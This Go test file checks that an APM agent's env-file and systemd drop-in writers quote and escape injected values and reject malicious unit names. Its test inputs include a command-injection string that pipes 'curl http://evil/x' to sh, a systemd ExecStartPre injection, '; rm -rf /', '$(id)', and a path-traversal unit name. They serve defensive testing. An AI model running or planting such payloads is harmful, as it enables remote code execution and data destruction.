package defs

import (
	"strings"
	"testing"

	"wakora.io/agent/internal/apm"
)

func TestNodeEnvFileSurvivesAValueTheOperatorWillSource(t *testing.T) {
	hostile := `--max-old-space-size=512"; curl http://evil/x | sh; echo "`
	env := apm.NodeEnv("/var/lib/wakora/apm/node/wakora-register.js", "app", "http://127.0.0.1:4318", hostile, false)
	out := nodeEnvFile(env, "sha")

	for _, line := range strings.Split(out, "\n") {
		if !strings.HasPrefix(line, "NODE_OPTIONS=") {
			continue
		}
		v := strings.TrimPrefix(line, "NODE_OPTIONS=")
		if !strings.HasPrefix(v, "'") || !strings.HasSuffix(v, "'") {
			t.Fatalf("the env file is sourced by the operator's shell, so the value must be single quoted: %s", line)
		}
		inner := strings.TrimSuffix(strings.TrimPrefix(v, "'"), "'")
		if strings.Contains(inner, "'") {
			t.Fatalf("an unescaped quote closes the string and the rest runs as commands: %s", line)
		}
	}
	if !strings.Contains(out, "curl http://evil/x") {
		t.Fatal("the value must still be carried verbatim, only quoted")
	}
}

func TestSystemdDropinEscapesTheValue(t *testing.T) {
	hostile := `--require /a" 
ExecStartPre=/bin/sh -c "id`
	env := apm.NodeEnv("/reg.js", "app", "http://127.0.0.1:4318", hostile, false)
	out := nodeDropin(env, "")

	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		if line == "[Service]" {
			continue
		}
		if !strings.HasPrefix(line, "Environment=\"") || !strings.HasSuffix(line, "\"") {
			t.Fatalf("a value broke out of its Environment= line: %q", line)
		}
	}
	if strings.Contains(out, "ExecStartPre") && !strings.Contains(out, `\"`) {
		t.Fatal("an unescaped quote would let the value add its own unit directives")
	}
}

func TestShQuoteClosesTheQuoteItOpens(t *testing.T) {
	for _, in := range []string{`a'b`, `; rm -rf /`, `$(id)`, "back\\slash", ""} {
		q := shQuote(in)
		if !strings.HasPrefix(q, "'") || !strings.HasSuffix(q, "'") {
			t.Fatalf("%q was not quoted: %s", in, q)
		}
		if strings.Contains(strings.TrimSuffix(strings.TrimPrefix(q, "'"), "'"), "'") &&
			!strings.Contains(q, `'\''`) {
			t.Fatalf("%q escaped badly: %s", in, q)
		}
	}
}

func TestUnitNameRejectsWhatWouldRideIntoAPath(t *testing.T) {
	for _, ok := range []string{"nginx", "pm2-root.service", "myapp@prod", "app_1.service", "a-b.c"} {
		if !unitNameOK(ok) {
			t.Fatalf("a legitimate unit name was refused: %s", ok)
		}
	}
	for _, bad := range []string{"", "../../etc/systemd/system/sshd.service", "a b", "a;id", "a$(id)", "a\nb", "a/b", "a'b"} {
		if unitNameOK(bad) {
			t.Fatalf("a name that would break out of the command was accepted: %q", bad)
		}
	}
}
